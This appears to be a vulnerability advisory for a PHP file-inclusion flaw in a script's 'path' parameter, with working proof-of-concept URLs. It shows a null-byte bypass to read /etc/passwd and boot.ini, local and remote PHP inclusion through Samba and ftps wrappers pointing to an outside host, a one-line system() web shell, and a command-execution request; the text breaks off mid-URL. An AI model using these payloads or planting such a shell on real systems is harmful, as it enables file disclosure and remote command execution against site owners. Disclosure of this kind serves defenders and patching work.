"path" var is not properly sanitized before to be used to include files from
local resources. Look carefully at [\*]: script checks if "path" is
an existing and readable file, it must not contain "http://", "ftp://" url
wrappers and "../" chars, it must contain the ".php" extension.
This checks can be easily overrided to include files from local and external
resources, poc:
if magic\_quotes\_gpc = Off, you can view any file on target system using a null
char:
http://[target]/[path]/include.php?path=/etc/passwd%00.php
http://[target]/[path]/include.php?path=c:boot.ini%00.php
(about this: strstr() function find ".php" extension, but fopen() and include()
do not consider any char after a null char)
regardless of any php.ini settings you can include an arbitrary php file from
local resources:
http://[target]/[path]/include.php?path=c:[path\_to]test.php
http://[target]/[path]/include.php?path=/[path\_to]/test.php
also, since fopen() and include() functions support Samba and FTP secure url
wrappers, if allow\_url\_fopen = On, you can include a php file from external
resources, poc:
from a samba server:
http://[target]/[path]/include.php?path=\192.168.1.2cshell.php
from a ftp secure server (this should works if php is compiled in support for
OpenSSL)
http://[target]/[path]/include.php?path=ftps://username:password@somehos
t/shell.php
if shell.php have this code inside:
<?php system($\_GET[cmd]);?>
you can execute commands on target system, poc:
http://[target]/[path]/include.php?cmd=ls%20-la&path=\192.168.1.2cshe
